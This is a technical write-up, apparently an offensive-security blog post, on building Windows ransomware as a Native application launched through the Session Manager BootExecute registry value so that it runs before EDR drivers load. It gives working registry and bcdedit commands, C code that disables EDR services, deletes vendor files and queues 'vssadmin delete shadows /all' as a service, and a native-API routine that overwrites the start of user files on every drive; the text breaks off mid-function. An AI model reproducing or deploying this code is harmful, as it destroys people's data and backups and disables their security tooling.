# BootExecute Ransomware

Ransomware is a never-ending cat-and-mouse game, with EDR vendors pumping out products that "Stop ransomware with a modern approach" and other claims to stop ransomware. These solutions are conceptually indifferent, leveraging file system mini filters, canary files they monitor, and a set of heuristics. These heuristics typically look to correlate changes to files, looking for changes in entropy (increased entropy -> encryption), changes in file headers (mismatched file headers based on their file extensions, e.g., pdf with the wrong file header), and file renaming activity to known ransomware file extensions. They typically place these canary files in the directories that commonly begin enumeration, so the root of all directories, user data folders, and whatnot. The decoy files almost always belong under hidden folders named with symbols that lead to them being first in directory enumeration APIs. When ransomware encrypts their canary files first, renaming them, corrupting the file header, and after a threshold of around 300 files, they conclusively determines the executable responsible for this activity as malicious and thus kills it. Additionally, every product blocks the usage of volume shadow management utility tools (vssadmin, wmic shadowcopy, etc.) when containing the arguments to delete these volume shadow copies - implemented with PsSetCreateProcessNotifyRoutineEx to register a callback on process creation (and exit) that receives PS_CREATE_NOTIFY_INFO about newly created processes, including their command line.

Ultimately, this entire chain of events and detection correlation logic requires their kernel driver to be present on the system and running to register file system and process creation callbacks. We will only look at the endpoint aspect of ransomware, with the assumption that Domain Admin privileges have been obtained by an Adversary and the EDR has not stopped them until this point, which in many real cases happens.

This fundamental point builds up to the point where some ransomware variants have exploited the fact that when systems are booted into Safe Mode most pre-configured and registered software does NOT run. As we concluded earlier, EDR solutions rely on their minifilter drivers and kernel callbacks to be up and running to do anything useful to prevent ransomware. As Adversaries have done before, the sequence of leveraging bcdedit, registering your ransomware as a Safe Boot compatible service, and rebooting is enough to get around their anti-ransomware protections.

```cmd
bcdedit /set {current} safeboot minimal
shutdown /r /f t 00
```

Unsurprisingly, in this cat-and-mouse game, EDRs have caught onto this behavior and, as part of their anti-tampering mechanisms, prevent modification of the Boot Configuration Data (BCD)—however, this protection is often not enabled by default. Once ransomware reboots into Safe Mode, it can encrypt everything at its own leisure, not under the imperial control of the EDR drivers.

The infamous Mark Russinovich wrote an article on MSDN over 18 years ago titled "Inside Native Applications" describing that most people are still unaware of native applications on Windows. Lo and behold, this statement still holds much truth. These Native applications typically exist to run before the Win32 subsystem initialization and as a result, must only operate with Native API (NTDLL.dll) imports and have their entry point as NtProcessStartup(PPEB Peb).

To create a Native application with Visual Studio we need to update our project properites to use the WindowsApplicationForDrivers10.0 toolset, and under our Linker options we must specify Ignore All Default Libraries (/NODEFAULTLIB) and the SubSystem as Native (/SUBSYSTEM:NATIVE). Additionally, we must select an additional dependency (NTDLL.lib) - unless if you perform dynamic API resolution to identify the function addresses of our desired functions. This is trivial and indifferent to our cause, so we will keep it simple and link to NTDLL.

> Sidenote: EDRs don't typically scan executable files as soon as they hit the disk. They only scan them when they are executed! We would want to use dynamic API resolution to hide our import address table, among other things to make our process appear more benign. As BootExecute-esque registered applications run before EDR drivers load, they do not scan our processes with their AV engine - and as a result we do not need to spend any time to hide these properties.

These Native applications are executed before the Win32 subsystem initialization by being registered under "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\" under the "BootExecute" (MULTI_SZ) value. By building our ransomware as a Native application and registering it under the BootExecute value under the Session Manager key, our application will run before the Win32 subsystem initialization. Session Manager (SMSS.exe) executes our application; it looks through the BootExecute MULTI_SZ value and synchronously launches all the executables. It looks in C:\Windows\System32 for these executables, where we will store our ransomware binary!

`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *\0PerfectRansomware" /f`

The other option to run a Native application post-Win32 subsystem initialization, for no pragmatic reason, would be with RtlCreateUserProcess or any other native function to create processes.

BootExecute is not the only key that allows us to register this functionality. We can examine the strings of C:\Windows\System32\smss.exe under a disassembler and search for UTF-16 strings that contain "execute", and we're presented with some other options that are more undocumented - introduced in recent versions of Windows.

```
Address	Length	Type	String
.rdata:000000014001C208	00000018	C (16 bits) - UTF-16LE	BootExecute
.rdata:000000014001C220	0000002A	C (16 bits) - UTF-16LE	BootExecuteNoPnpSync
.rdata:000000014001B7D8	00000010	C (16 bits) - UTF-16LE	Execute
.rdata:000000014001C250	00000020	C (16 bits) - UTF-16LE	PlatformExecute
.rdata:000000014001C270	0000001A	C (16 bits) - UTF-16LE	SetupExecute
.rdata:000000014001C290	0000002C	C (16 bits) - UTF-16LE	SetupExecuteNoPnpSync
```

> Most EDRs will create a persistence detection when the registry key is written. I have not seen an EDR that removes the registry key entry or deletes the file post-detection. Additionally, many EDRs are unaware of some of the newer keys, as they were introduced in newer versions of Windows.

Most of these keys do not exist by default under Session Manager; however, for the scope of our discussion and interests, they are processed similarly to BootExecute. To register our application, it would be alike to the previously shown registry key entry:

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "BootExecuteNoPnpSync" /t REG_MULTI_SZ /d "PerformRansomware" /f
```

It is rather surprising and known that these Native applications do not require any form of code signing, just admin privileges, to launch before the Win32 subsystem initialization as SYSTEM! It is unarguably an incredibly powerful primitive that I find surprisingly less abused, given the potential - as we will demonstrate - to tamper with other processes and services.

By default, these Native applications, when registered under the \*Execute family of values, are awaited upon being launched by SMSS. We will leverage this family of keys, keeping it simple with BootExecute as our execution primitive for our ransomware. Our ransomware will run before the Win32 subsystem initialization, encrypting the entire system **before** EDR drivers can load. Additionally, we explore a new way of tampering with EDR services to prevent them from being loaded so we can leverage the vssadmin utility to delete volume shadow copies.

Our actual ransomware logic is relatively trivial and not that interesting. For a working proof of concept to demonstrate how the approach works, we will use concepts adapted from the Babuk ransomware source code, adjusting it to leverage the Native API interface. Ransomware typically follows the flow of identifying all the drives, performing a depth-first search of each drive, and encrypting each file for each.

We will leverage a queue to perform an iterative depth-first search approach and a second queue to which we will send "work" and the files to be "encrypted." Encryption is the most trivial functionality to implement, so we will just NULL out the file's first minimum(file size, 4KB). Additionally, we will disable EDR services and delete volume shadow copies. We will explore each of these concepts backward.

The Volume Shadow Copy Service (VSS) enables "backing up and restoring critical business data" by creating point-in-time copies of the data and drives to be backed up. There are a number of various Windows command line utilities that enable volume shadow copy (VSC) management: vssadmin, wmic, wbadmin. EDRs as discussed previously will leverage process creation notification callbacks to inspect the command lines of these applications. They can veto and kill the process if it matches one of their signatures. There is additionally a COM/WMI interface. However, as our Native application runs before the Win32 subsystem initialization, we cannot work this way, and our application cannot have any non-Native (NTDLL.dll) imports.

As we cannot call vssadmin.exe successfully before Win32 subsystem initialization, we will "queue" it by registering a new service that runs as LocalSystem and will autostart later in the initialization.

One caveat, however, is that all Services must interact with the SCM to notify it of a successful startup within a certain period, or else they face program termination. To overcome this, we can keep it simple and just leverage cmd.exe /c to execute vssadmin. The termination signal is not propagated to the child process by SCM, so our vssadmin command will not die.

```c
NTSTATUS CreateVssadminDeleteService() {
    NTSTATUS status;
    UNICODE_STRING servicesKeyName, serviceKeyName, valName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hServices, hService;

    RtlInitUnicodeString(&servicesKeyName, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services");

    InitializeObjectAttributes(&oa, &servicesKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = NtOpenKey(&hServices, KEY_CREATE_SUB_KEY, &oa);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    RtlInitUnicodeString(&serviceKeyName, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\vss-service");

    OBJECT_ATTRIBUTES svcOa;
    InitializeObjectAttributes(&svcOa, &serviceKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ULONG disposition = 0;
    status = NtCreateKey(&hService,
        KEY_SET_VALUE,
        &svcOa,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        &disposition);

    NtClose(hServices);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    ULONG typeVal = 0x10;
    RtlInitUnicodeString(&valName, L"Type");
    NtSetValueKey(hService, &valName, 0, REG_DWORD, &typeVal, sizeof(typeVal));

    ULONG startVal = 2;
    RtlInitUnicodeString(&valName, L"Start");
    NtSetValueKey(hService, &valName, 0, REG_DWORD, &startVal, sizeof(startVal));

    ULONG errVal = 1;
    RtlInitUnicodeString(&valName, L"ErrorControl");
    NtSetValueKey(hService, &valName, 0, REG_DWORD, &errVal, sizeof(errVal));

    WCHAR imagePath[] = L"cmd /c \"vssadmin.exe delete shadows /all\"";
    RtlInitUnicodeString(&valName, L"ImagePath");
    NtSetValueKey(hService,
        &valName,
        0,
        REG_EXPAND_SZ,
        imagePath,
        (ULONG)(wcslen(imagePath) * sizeof(WCHAR)));

    WCHAR dispName[] = L"vssadmin";
    RtlInitUnicodeString(&valName, L"DisplayName");
    NtSetValueKey(hService,
        &valName,
        0,
        REG_SZ,
        dispName,
        (ULONG)(wcslen(dispName) * sizeof(WCHAR)) + 1);

    WCHAR objName[] = L"LocalSystem";
    RtlInitUnicodeString(&valName, L"ObjectName");
    NtSetValueKey(hService,
        &valName,
        0,
        REG_SZ,
        objName,
        (ULONG)(wcslen(objName) * sizeof(WCHAR)));

    NtClose(hService);

    return STATUS_SUCCESS;
}
```

We mentioned earlier that EDRs will load after Win32 subsystem initialization, and our service will be executed around that time. To prevent EDRs from killing our command line, we will need to disable the EDR services/drivers from loading. Regarding options, we can delete the EDR files that exist under C:\Program Files\, but then their driver will still load and veto our vssadmin command line.

```c
OBJECT_ATTRIBUTES objAttr = { 0 };
UNICODE_STRING filePath = { 0 };

RtlInitUnicodeString(&filePath, L"\\??\\C:\\Program Files\\Vendor\\VendorService.exe");
InitializeObjectAttributes(&objAttr, &file_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

NtDeleteFile(&objAttr);
```

Drivers and services have their "registration" present in the registry. A better approach would be to tamper with these registry keys during our application and change their "Start" and "Type" values to 0x4 (Disabled) and 0x10 (Win32 own process), respectively, so that their services do NOT start. We maintain an arrray of known EDR service/driver names (additional information can be found from the publicly available MSDN Allocated Filter Altitudes list). We can then iterate through all the registry entries under "CurrentControlSet\Services" and if any of the service names match our hardcoded array, we can update the aforementioned values.

When their drivers are running, EDRs leverage the CmRegisterCallbackEx function to receive registry request information, allowing them to prevent any modification/manipulation of their registry keys. However, as mentioned several times before, as their driver is not running and their callbacks are not registered before Win32 subsystem initialization, they cannot veto our changes!

```c
static const WCHAR* services[] = { L"Vendor", L"VendorDriver" };

static const WCHAR ServicesPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services";

NTSTATUS SetDwordValue(HANDLE KeyHandle, PCWSTR ValueName, ULONG Value) {
    UNICODE_STRING valName;
    RtlInitUnicodeString(&valName, ValueName);
    return NtSetValueKey(KeyHandle, &valName, 0, REG_DWORD, &Value, sizeof(Value));
}

NTSTATUS DisableServices() {
    UNICODE_STRING servicesKeyName;
    RtlInitUnicodeString(&servicesKeyName, ServicesPath);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &servicesKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hServices;
    NTSTATUS status = NtOpenKey(&hServices, KEY_READ, &oa);
    if (!NT_SUCCESS(status)) return status;

    ULONG index = 0;

    for (;;) {
        BYTE* buffer = NULL;
        PWCH fullBuf = NULL;
        BOOLEAN present = FALSE;

        buffer = (BYTE*)RtlAllocateHeap(g_Heap, 0, 4096);
        if (!buffer) {
            status = STATUS_NO_MEMORY;
            goto service_cleanup;
        }

        PKEY_BASIC_INFORMATION kbi = (PKEY_BASIC_INFORMATION)buffer;
        ULONG retLen = 0;

        status = NtEnumerateKey(hServices, index, KeyBasicInformation, kbi, 4096, &retLen);
        if (!NT_SUCCESS(status) || status == STATUS_NO_MORE_ENTRIES) {
            goto service_cleanup;
        }

        USHORT serviceNameLen = (USHORT)kbi->NameLength;
        USHORT charsCount = serviceNameLen / sizeof(WCHAR);
        if (charsCount > 259) charsCount = 259;
        WCHAR serviceNameBuf[260];
        memcpy(serviceNameBuf, kbi->Name, charsCount * sizeof(WCHAR));
        serviceNameBuf[charsCount] = L'\0';

        for (int i = 0; i < (int)(sizeof(services) / sizeof(services[0])); i++) {
            if (_wcsicmp(serviceNameBuf, services[i]) == 0) {
                present = TRUE;
                break;
            }
        }

        if (present) {
            UNICODE_STRING basePath;
            RtlInitUnicodeString(&basePath, ServicesPath);

            USHORT totalLen = basePath.Length + sizeof(WCHAR) + serviceNameLen;
            fullBuf = (PWCH)RtlAllocateHeap(g_Heap, 0, totalLen + sizeof(WCHAR));
            if (!fullBuf) {
                status = STATUS_NO_MEMORY;
                goto service_cleanup;
            }

            memcpy(fullBuf, basePath.Buffer, basePath.Length);
            fullBuf[basePath.Length / sizeof(WCHAR)] = L'\\';
            memcpy(&fullBuf[(basePath.Length / sizeof(WCHAR)) + 1], kbi->Name, serviceNameLen);
            fullBuf[totalLen / sizeof(WCHAR)] = L'\0';

            UNICODE_STRING serviceKeyName;
            serviceKeyName.Buffer = fullBuf;
            serviceKeyName.Length = totalLen;
            serviceKeyName.MaximumLength = totalLen + sizeof(WCHAR);

            OBJECT_ATTRIBUTES svcOa;
            InitializeObjectAttributes(&svcOa, &serviceKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

            HANDLE hService;
            NTSTATUS openStatus = NtOpenKey(&hService, KEY_ALL_ACCESS, &svcOa);

            if (NT_SUCCESS(openStatus)) {
                SetDwordValue(hService, L"Start", 4);
                SetDwordValue(hService, L"Type", 0x10);
                NtClose(hService);
            }
        }

    service_cleanup:
        if (fullBuf) RtlFreeHeap(g_Heap, 0, fullBuf);
        if (buffer) RtlFreeHeap(g_Heap, 0, buffer);

        if (!NT_SUCCESS(status) || status == STATUS_NO_MORE_ENTRIES) {
            break;
        }

        index++;
    }

    NtClose(hServices);
    return (status == STATUS_NO_MORE_ENTRIES) ? STATUS_SUCCESS : status;
}
```

The less interesting, for the point of our discussion and research, the ransomware implementation is rather simple. We maintain two queues, one to perform an iterative depth first search of the file system, and the second to enqueue files to handle. We begin by identifying the drives present on the system (by iterating from C:\ through to Z:\) and attempting to open a handle to it to determine whether it exists.

```c
    for (WCHAR letter = L'C'; letter <= L'Z'; letter++) {
        driveRoot.Length = 0;
        driveRoot.MaximumLength = sizeof(driveRootBuf);
        driveRoot.Buffer = driveRootBuf;

        RtlAppendUnicodeToString(&driveRoot, L"\\??\\");
        WCHAR letterStr[3] = { letter, L':', 0 };
        RtlAppendUnicodeToString(&driveRoot, letterStr);
        RtlAppendUnicodeToString(&driveRoot, L"\\");

        InitializeObjectAttributes(&oa, &driveRoot, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE hFile;
        NTSTATUS openStatus = NtOpenFile(
            &hFile,
            FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &oa,
            &iosb,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
        );
```

If so, we enqueue it our first queue responsible for a depth first search of the file system. We then create X threads, where X is the count of processors, for both our DFS and worker threads.

```c
HANDLE* dirThreads = (HANDLE*)RtlAllocateHeap(g_Heap, 0, sizeof(HANDLE) * g_DirThreadCount);
for (ULONG i = 0; i < g_DirThreadCount; i++) {
    HANDLE hThread;
    RtlCreateUserThread(NtCurrentProcess(), NULL, FALSE, 0, 0, 0, DirectoryWorkerThread, NULL, &hThread, NULL);
    dirThreads[i] = hThread;
}

HANDLE* fileThreads = (HANDLE*)RtlAllocateHeap(g_Heap, 0, sizeof(HANDLE) * g_FileThreadCount);
for (ULONG i = 0; i < g_FileThreadCount; i++) {
    HANDLE hThread;
    RtlCreateUserThread(NtCurrentProcess(), NULL, FALSE, 0, 0, 0, FileConsumerThread, NULL, &hThread, NULL);
    fileThreads[i] = hThread;
}
```

Our directory enumeration worker threads dequeue an element, and enumerate the files within the directory, queuing either a directory to the directory queue (fufilling our iterative DFS) or to the worker queue. We additionally check whether it's a file in our black list and that we'd like to skip.

```
NTSTATUS EnumerateDirectory(PCUNICODE_STRING DirectoryPath) {
    NTSTATUS status;
    HANDLE hDir;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;

    InitializeObjectAttributes(&oa, (PUNICODE_STRING)DirectoryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = NtOpenFile(&hDir, FILE_LIST_DIRECTORY | SYNCHRONIZE, &oa, &iosb,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(status)) return status;

    BYTE* buffer = (BYTE*)RtlAllocateHeap(g_Heap, 0, 4096);
    if (!buffer) {
        NtClose(hDir);
        return STATUS_NO_MEMORY;
    }

    PFILE_DIRECTORY_INFORMATION fdi = (PFILE_DIRECTORY_INFORMATION)buffer;
    for (;;) {
        memset(buffer, 0, 4096);
        status = NtQueryDirectoryFile(hDir, NULL, NULL, NULL, &iosb, fdi, 4096,
            FileDirectoryInformation, FALSE, NULL, FALSE);
        if (status == STATUS_NO_MORE_FILES) {
            status = STATUS_SUCCESS;
            break;
        }
        if (!NT_SUCCESS(status)) break;

        PBYTE ptr = (PBYTE)fdi;
        for (;;) {
            PFILE_DIRECTORY_INFORMATION entry = (PFILE_DIRECTORY_INFORMATION)ptr;
            BOOLEAN isDir = (entry->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? TRUE : FALSE;
            if (ShouldSkipName(entry->FileName, entry->FileNameLength / sizeof(WCHAR), isDir)) {
                if (entry->NextEntryOffset == 0) break;
                ptr += entry->NextEntryOffset;
                continue;
            }

            ULONG baseLen = DirectoryPath->Length / sizeof(WCHAR);
            BOOLEAN endsWithBackslash = (baseLen > 0 && DirectoryPath->Buffer[baseLen - 1] == L'\\');
            ULONG newLen = DirectoryPath->Length + entry->FileNameLength + (endsWithBackslash ? 0 : sizeof(WCHAR));

            PWCH fullPathBuf = (PWCH)RtlAllocateHeap(g_Heap, 0, newLen + sizeof(WCHAR));
            if (!fullPathBuf) {
                status = STATUS_NO_MEMORY;
                break;
            }

            memcpy(fullPathBuf, DirectoryPath->Buffer, DirectoryPath->Length);
            if (!endsWithBackslash) {
                fullPathBuf[baseLen] = L'\\';
                memcpy(&fullPathBuf[baseLen + 1], entry->FileName, entry->FileNameLength);
                fullPathBuf[newLen / sizeof(WCHAR)] = L'\0';
            }
            else {
                memcpy(&fullPathBuf[baseLen], entry->FileName, entry->FileNameLength);
                fullPathBuf[newLen / sizeof(WCHAR)] = L'\0';
            }

            QUEUE_ITEM* newItem = (QUEUE_ITEM*)RtlAllocateHeap(g_Heap, HEAP_ZERO_MEMORY, sizeof(QUEUE_ITEM));
            if (!newItem) {
                RtlFreeHeap(g_Heap, 0, fullPathBuf);
                status = STATUS_NO_MEMORY;
                break;
            }

            newItem->Path.Buffer = fullPathBuf;
            newItem->Path.Length = (USHORT)newLen;
            newItem->Path.MaximumLength = (USHORT)(newLen + sizeof(WCHAR));

            if (isDir) {
                InterlockedIncrement(&g_OutstandingDirectories);
                Enqueue(&g_DirectoryQueue, newItem);
            }
            else {
                Enqueue(&g_FileQueue, newItem);
            }

            if (entry->NextEntryOffset == 0) break;
            ptr += entry->NextEntryOffset;
        }

        if (!NT_SUCCESS(status)) break;
    }

    NtClose(hDir);
    RtlFreeHeap(g_Heap, 0, buffer);
    return status;
}
```

Our worker thread follows a similar logic, dequeuing an item containing the path to the file, and handling it - in this case just NULLing out the first minimum(file size, 4KB) of the file, simulating ransomware. This part was briefly implemented as it frankly the least interesting part. Actual ransomware would encrypt the first 4KB or every other 4KB of a file, and then append a structure to the end of the file containing the file encryption information, often an asymmetric key encrypted with their public key - something only they can read back and decrypt - and obviously renaming it.

What follows is the demonstration of the file system enumeration, and file "encryption" with only native APIs.

```
#define UMDF_USING_NTSTATUS
#include <Windows.h>
#include <ntstatus.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef struct _QUEUE_ITEM {
    struct _QUEUE_ITEM* Next;
    UNICODE_STRING Path;
} QUEUE_ITEM, * PQUEUE_ITEM;

typedef struct _QUEUE {
    PQUEUE_ITEM Head;
    PQUEUE_ITEM Tail;
    RTL_SRWLOCK Lock;
    RTL_CONDITION_VARIABLE NonEmpty;
} QUEUE, * PQUEUE;

PVOID g_Heap;
QUEUE g_DirectoryQueue;
QUEUE g_FileQueue;
LONG g_OutstandingDirectories = 0;
BOOLEAN g_Done = FALSE;

static const WCHAR* black[] = {
    0, L"..", L"."
    L"AppData",
    L"Boot",
    L"Windows",
    L"Windows.old",
    L"$Recycle.Bin",
    L"ProgramData",
    L"All Users",
    L"autorun.inf",
    L"boot.ini",
    L"bootfont.bin",
    L"bootsect.bak",
    L"bootmgr",
    L"bootmgr.efi",
    L"bootmgfw.efi",
    L"desktop.ini",
    L"iconcache.db",
    L"ntldr",
    L"ntuser.dat",
    L"ntuser.dat.log",
    L"ntuser.ini",
    L"thumbs.db",
    L"Program Files",
    L"Program Files (x86)",
    L"#recycle",
};


BOOLEAN ShouldSkipName(PCWSTR FileName, ULONG NameLength, BOOLEAN IsDirectory) {
    WCHAR tempName[260];
    ULONG copyLength = (NameLength < 259) ? NameLength : 259;
    memcpy(tempName, FileName, copyLength * sizeof(WCHAR));
    tempName[copyLength] = L'\0';

    for (int i = 1; i < (int)(sizeof(black) / sizeof(black[0])); i++) {
        if (_wcsicmp(tempName, black[i]) == 0) return TRUE;
    }

    if (!IsDirectory) {
        WCHAR* ext = _wcsrchr(tempName, L'.');
        if (ext) {
            if ((_wcsicmp(ext, L".exe") == 0) || (_wcsicmp(ext, L".dll") == 0))
                return TRUE;
        }
    }
    return FALSE;
}

VOID InitQueue(PQUEUE Q) {
    Q->Head = Q->Tail = NULL;
    RtlInitializeSRWLock(&Q->Lock);
    RtlInitializeConditionVariable(&Q->NonEmpty);
}

VOID Enqueue(PQUEUE Q, PQUEUE_ITEM Item) {
    RtlAcquireSRWLockExclusive(&Q->Lock);
    Item->Next = NULL;
    if (Q->Tail) {
        Q->Tail->Next = Item;
    }
    else {
        Q->Head = Item;
    }
    Q->Tail = Item;
    RtlWakeAllConditionVariable(&Q->NonEmpty);
    RtlReleaseSRWLockExclusive(&Q->Lock);
}

PQUEUE_ITEM DequeueWithWait(PQUEUE Q, PLONG pOutstandingDirs) {
    RtlAcquireSRWLockExclusive(&Q->Lock);
    while (!Q->Head && !g_Done) {
        RtlSleepConditionVariableSRW(&Q->NonEmpty, &Q->Lock, NULL, 0);
    }

    if (g_Done && !Q->Head) {
        RtlReleaseSRWLockExclusive(&Q->Lock);
        return NULL;
    }

    PQUEUE_ITEM Item = Q->Head;
    if (Item) {
        Q->Head = Item->Next;
        if (!Q->Head) Q->Tail = NULL;
    }

    RtlReleaseSRWLockExclusive(&Q->Lock);
    return Item;
}

PQUEUE_ITEM Dequeue(PQUEUE Q) {
    RtlAcquireSRWLockExclusive(&Q->Lock);
    PQUEUE_ITEM Item = Q->Head;
    if (Item) {
        Q->Head = Item->Next;
        if (!Q->Head) Q->Tail = NULL;
    }
    RtlReleaseSRWLockExclusive(&Q->Lock);
    return Item;
}


NTSTATUS EnumerateDirectory(PCUNICODE_STRING DirectoryPath) {
    NTSTATUS status;
    HANDLE hDir;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;

    InitializeObjectAttributes(&oa, (PUNICODE_STRING)DirectoryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = NtOpenFile(&hDir, FILE_LIST_DIRECTORY | SYNCHRONIZE, &oa, &iosb,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(status)) return status;

    BYTE* buffer = (BYTE*)RtlAllocateHeap(g_Heap, 0, 4096);
    if (!buffer) {
        NtClose(hDir);
        return STATUS_NO_MEMORY;
    }

    PFILE_DIRECTORY_INFORMATION fdi = (PFILE_DIRECTORY_INFORMATION)buffer;
    for (;;) {
        memset(buffer, 0, 4096);
        status = NtQueryDirectoryFile(hDir, NULL, NULL, NULL, &iosb, fdi, 4096,
            FileDirectoryInformation, FALSE, NULL, FALSE);
        if (status == STATUS_NO_MORE_FILES) {
            status = STATUS_SUCCESS;
            break;
        }
        if (!NT_SUCCESS(status)) break;

        PBYTE ptr = (PBYTE)fdi;
        for (;;) {
            PFILE_DIRECTORY_INFORMATION entry = (PFILE_DIRECTORY_INFORMATION)ptr;
            BOOLEAN isDir = (entry->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? TRUE : FALSE;
            if (ShouldSkipName(entry->FileName, entry->FileNameLength / sizeof(WCHAR), isDir)) {
                if (entry->NextEntryOffset == 0) break;
                ptr += entry->NextEntryOffset;
                continue;
            }

            ULONG baseLen = DirectoryPath->Length / sizeof(WCHAR);
            BOOLEAN endsWithBackslash = (baseLen > 0 && DirectoryPath->Buffer[baseLen - 1] == L'\\');
            ULONG newLen = DirectoryPath->Length + entry->FileNameLength + (endsWithBackslash ? 0 : sizeof(WCHAR));

            PWCH fullPathBuf = (PWCH)RtlAllocateHeap(g_Heap, 0, newLen + sizeof(WCHAR));
            if (!fullPathBuf) {
                status = STATUS_NO_MEMORY;
                break;
            }

            memcpy(fullPathBuf, DirectoryPath->Buffer, DirectoryPath->Length);
            if (!endsWithBackslash) {
                fullPathBuf[baseLen] = L'\\';
                memcpy(&fullPathBuf[baseLen + 1], entry->FileName, entry->FileNameLength);
                fullPathBuf[newLen / sizeof(WCHAR)] = L'\0';
            }
            else {
                memcpy(&fullPathBuf[baseLen], entry->FileName, entry->FileNameLength);
                fullPathBuf[newLen / sizeof(WCHAR)] = L'\0';
            }

            QUEUE_ITEM* newItem = (QUEUE_ITEM*)RtlAllocateHeap(g_Heap, HEAP_ZERO_MEMORY, sizeof(QUEUE_ITEM));
            if (!newItem) {
                RtlFreeHeap(g_Heap, 0, fullPathBuf);
                status = STATUS_NO_MEMORY;
                break;
            }

            newItem->Path.Buffer = fullPathBuf;
            newItem->Path.Length = (USHORT)newLen;
            newItem->Path.MaximumLength = (USHORT)(newLen + sizeof(WCHAR));

            if (isDir) {
                InterlockedIncrement(&g_OutstandingDirectories);
                Enqueue(&g_DirectoryQueue, newItem);
            }
            else {
                Enqueue(&g_FileQueue, newItem);
            }

            if (entry->NextEntryOffset == 0) break;
            ptr += entry->NextEntryOffset;
        }

        if (!NT_SUCCESS(status)) break;
    }

    NtClose(hDir);
    RtlFreeHeap(g_Heap, 0, buffer);
    return status;
}


void HandleFile(PUNICODE_STRING Path) {
    HANDLE hFile = NULL;
    IO_STATUS_BLOCK iosb;
    FILE_STANDARD_INFORMATION fsi;
    LARGE_INTEGER offset;
    NTSTATUS status;
    BYTE* zeroBuffer = (BYTE*)RtlAllocateHeap(g_Heap, HEAP_ZERO_MEMORY, 4096);

    if (!zeroBuffer) return;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, Path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) goto cleanup;

    status = NtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
    if (!NT_SUCCESS(status)) goto cleanup;

    if (fsi.EndOfFile.QuadPart > 0) {
        ULONG writeLen = (ULONG)((fsi.EndOfFile.QuadPart < 4096) ? fsi.EndOfFile.QuadPart : 4096);
        offset.QuadPart = 0;
        NtWriteFile(hFile, NULL, NULL, NULL, &iosb, zeroBuffer, writeLen, &offset, NULL);
    }

cleanup:
    if (zeroBuffer) RtlFreeHeap(g_Heap, 0, zeroBuffer);
    if (hFile) NtClose(hFile);
}

NTSTATUS DirectoryWorkerThread(PVOID Context) {
    UNREFERENCED_PARAMETER(Context);

    for (;;) {
        PQUEUE_ITEM item = DequeueWithWait(&g_DirectoryQueue, &g_OutstandingDirectories);
        if (!item) {
            RtlAcquireSRWLockExclusive(&g_DirectoryQueue.Lock);
            BOOLEAN done = g_Done;
            RtlReleaseSRWLockExclusive(&g_DirectoryQueue.Lock);
            if (done) break;
            continue;
        }

        EnumerateDirectory(&item->Path);
        LONG newCount = InterlockedDecrement(&g_OutstandingDirectories);

        RtlFreeHeap(g_Heap, 0, item->Path.Buffer);
        RtlFreeHeap(g_Heap, 0, item);

        RtlAcquireSRWLockExclusive(&g_DirectoryQueue.Lock);
        if (newCount == 0 && g_DirectoryQueue.Head == NULL) {
            g_Done = TRUE;
            RtlWakeAllConditionVariable(&g_DirectoryQueue.NonEmpty);
        }
        RtlReleaseSRWLockExclusive(&g_DirectoryQueue.Lock);

        if (g_Done) break;
    }

    return STATUS_SUCCESS;
}

NTSTATUS FileConsumerThread(PVOID Context) {
    UNREFERENCED_PARAMETER(Context);

    for (;;) {
        RtlAcquireSRWLockExclusive(&g_FileQueue.Lock);
        while (!g_FileQueue.Head && !g_Done) {
            RtlSleepConditionVariableSRW(&g_FileQueue.NonEmpty, &g_FileQueue.Lock, NULL, 0);
        }

        PQUEUE_ITEM item = g_FileQueue.Head;
        if (item) {
            g_FileQueue.Head = item->Next;
            if (!g_FileQueue.Head) g_FileQueue.Tail = NULL;
        }
        RtlReleaseSRWLockExclusive(&g_FileQueue.Lock);

        if (!item) {
            if (g_Done) break;
            continue;
        }

        HandleFile(&item->Path);
        RtlFreeHeap(g_Heap, 0, item->Path.Buffer);
        RtlFreeHeap(g_Heap, 0, item);

        if (g_Done) {
